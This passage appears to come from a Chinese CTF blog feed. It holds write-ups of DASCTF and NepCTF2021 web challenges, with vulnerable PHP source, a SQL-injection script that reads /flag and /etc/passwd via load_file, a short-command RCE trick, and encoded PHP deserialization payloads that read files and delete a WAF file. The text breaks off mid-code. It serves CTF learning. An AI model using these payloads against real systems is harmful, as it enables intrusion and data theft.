variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'delete'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'drop'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token variable">$item</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Forbidden!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$query</span></span>' OR username = \"<span class="token interpolation"><span class="token variable">$query</span></span>\""</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>&lt;tr>&lt;th>ID&lt;/th>&lt;th>UserName&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;tr>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;/tr>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/table>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">// dbConnect.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$serve</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'users'</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysqli</span><span class="token punctuation">(</span><span class="token variable">$serve</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'connect error:'</span><span class="token punctuation">.</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置数据库字符集</span></span></code></pre><p>读取根目录下flag，由于ban了<code>flag</code>，转十六进制即可</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,hex(load_file(0x2f666c6167)),3"</span></code></pre><p><code>hex(&#39;/flag&#39;)==&#39;0x2f666c6167&#39;</code></p><p>结束了</p><p>附上小脚本，虽然没啥用</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 27, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://ea4d13de-db0a-41e5-b303-a843bd51a27b.machine.dasctf.com/?query="</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Forbidden"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Forbidden"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,database(),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># databases==========>users</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select group_concat(table_name) from information_schema.tables where table_schema like database()),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># tables==========>f1agdas,users</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select `2` from (select 1,2 union select * from f1agdas limit 1,1)a),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># flag.columns==========>flag.txt</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,hex(load_file(0x2f666c6167)),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># database()</span>    <span class="token comment"># table()</span>    <span class="token comment"># columns()</span>    data<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><p>以下是本人的碎碎念和反思，师傅们可以跳过惹</p><p>经验不足，最后还是没能出这简单题。一方面也是平台的问题，实在太卡了:(</p><p>数据库里写的<code>flag.txt</code>，最后却在根目录<code>/flag</code>。尝试过十六进制<code>/flag</code>读取，可能是因为太卡了，没成功就没再试了，以为就是<code>flag.txt</code>。盲猜有人拿到注入题直接sqlmap开始跑（因为之前我也干过），导致服务器负载太大，或者说运维去三亚了2333</p><p>还尝试了读取一堆无用的东西，以为和 <a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 2018]Comment</a> 一样</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># @@datadir</span><span class="token comment"># /var/lib/mysql/</span><span class="token comment"># @@basedir</span><span class="token comment"># /usr/</span><span class="token comment"># /etc/host</span><span class="token comment"># 127.0.0.1localhost</span><span class="token comment"># ::1localhost ip6-localhost ip6-loopback</span><span class="token comment"># fe00::0ip6-localnet</span><span class="token comment"># ff00::0ip6-mcastprefix</span><span class="token comment"># ff02::1ip6-allnodes</span><span class="token comment"># ff02::2ip6-allrouters</span><span class="token comment"># 192.168.0.1149fa7a3d75b4f</span><span class="token comment"># /etc/passwd</span><span class="token comment"># root:x:0:0:root:/root:/bin/bash</span><span class="token comment"># daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="token comment"># bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span class="token comment"># sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span class="token comment"># sync:x:4:65534:sync:/bin:/bin/sync</span><span class="token comment"># games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span class="token comment"># man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span class="token comment"># lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="token comment"># mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span class="token comment"># news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span class="token comment"># uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="token comment"># proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span class="token comment"># www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span class="token comment"># backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span class="token comment"># list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span class="token comment"># irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="token comment"># gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span class="token comment"># nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span class="token comment"># _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><span class="token comment"># mysql:x:101:101:MySQL Server,,,:/var/lib/mysql/:/bin/false</span></code></pre><p>没有线索，盲猜读了个<code>start.sh</code></p><pre class="language-sh" data-language="sh"><code class="language-sh">#!&#x2F;bin&#x2F;bashrm -rf &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock.lockrm -rf &#x2F;tmp&#x2F;mysql.sockusermod -d &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; mysqlln -s &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock &#x2F;tmp&#x2F;mysql.sockchown -R mysql:mysql &#x2F;var&#x2F;lib&#x2F;mysqlmysqld_safe &amp;mysql_ready() &#123;mysqladmin ping --socket&#x3D;&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock --user&#x3D;root --password&#x3D;root &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1&#125;while !(mysql_ready)doecho &quot;waiting for mysql ...&quot;sleep 3donemysql -e &quot;ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;;flush privileges;&quot; -uroot -prootif [[ -f &#x2F;db.sql ]]; then    mysql -e &quot;source &#x2F;db.sql&quot; -uroot -proot    rm -f &#x2F;db.sqlfiif [[ -f &#x2F;flag.sh ]]; thensource &#x2F;flag.shfiapache2-foreground</code></pre><p>然后开始爆<code>/proc/[id]/fd/[id]</code>一去不复返了。平台弄卡也有我的一份～</p><p>甚至还读了apache配置文件等等等，实在是经验不足，还是本人太菜了2333</p><p>做个反思吧，也许哪天羞耻心爆发这段就给我删了。</p><p>写给他人明鉴，写给自己反思。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;sql注入的姿势&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF2021</title>
    <link href="https://err0r.top/article/Nepctf2021/"/>
    <id>https://err0r.top/article/Nepctf2021/</id>
    <published>2021-03-22T04:59:47.000Z</published>
    <updated>2021-03-30T11:45:53.216Z</updated>
    
    <content type="html"><![CDATA[<p>队伍名称：Err0r</p><a id="more"></a><p>队伍情况：</p><img src="/article/Nepctf2021/image-20210322130933265.png" class="" title="rank" loading="lazy"><p>虽然平台八太行，但是部分题目质量很高，本菜鸡爬了，虚心学习。</p><p>本Wp侧重于思路记录，大佬们轻喷…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`cat`<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`<span class="token operator">*</span><span class="token operator">></span>a`<span class="token punctuation">;</span>访问<span class="token punctuation">.</span><span class="token operator">/</span>a</code></pre><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>非常简洁，传入两个参数然后<code>eval</code>执行，格式为</p><pre class="language-none"><code class="language-none">.&#x2F;?nep&#x3D;&#96;payload&#96;;&amp;len&#x3D;n</code></pre><p>利用`反引号和分号;执行命令</p><p>首先看到<code>len</code>用来截断字符串<code>nep</code>，而if中<code>intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13</code>即长度不相等，刚开始以为需要利用整形溢出</p><blockquote><p>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p></blockquote><p>测试了一下发现不对，传入字符串视为<strong>字符串类型</strong>，并不存在整形溢出，如下</p><img src="/article/Nepctf2021/image-20210322140444729.png" class="" title="intval" loading="lazy"><p>所以思路不对，接下来想到四字符RCE，<a href="https://blog.csdn.net/q20010619/article/details/109206728">参考文章</a>，测试了一下，问题是测试下来目录非常的杂乱</p><p>flag就在当前目录，无法准确直接cat。<strong>此脚本无效，以前的脚本直接用，仅展示</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 20, 2021"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:10001/nep2021/little_trick/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?len=7&amp;nep="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'>dir'</span><span class="token punctuation">,</span> <span class="token string">'>f\>'</span><span class="token punctuation">,</span> <span class="token string">'>kt-'</span><span class="token punctuation">,</span> <span class="token string">'>sl'</span><span class="token punctuation">,</span> <span class="token string">'*>v'</span><span class="token punctuation">,</span> <span class="token string">'>rev'</span><span class="token punctuation">,</span> <span class="token string">'*v>b'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload0<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'`;'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        待续</code></pre><p>访问下v，结果仅能扫到目录</p><img src="/article/Nepctf2021/image-20210322142144631.png" class="" title="list" loading="lazy"><p>目录变得非常乱，于是想为何不能利用<code>*</code>直接读文件呢</p><blockquote><p>输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p></blockquote><p>测试如下</p><img src="/article/Nepctf2021/image-20210322143017075.png" class="" title="test" loading="lazy"><p>测试可行，输出一个<code>cat</code>文件，然后目录就有<code>cat</code>/<code>index.php</code>/<code>nepctf.php</code>了，然后执行<code>*&gt;a</code>，即将目录内容当作命令执行输出到文件a，cat全部文件，然后访问文件a即可</p><img src="/article/Nepctf2021/image-20210322144032886.png" class="" title="image-20210322144032886" loading="lazy"><hr><h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h4><pre class="language-none"><code class="language-none">读取shell.php：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30&#x3D;---删除waf.txt：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;---读取flag：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9是不是很简单？</code></pre><p>很文艺的名字，我信了它《简单的PHP反序列化》</p><h4 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h4><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token 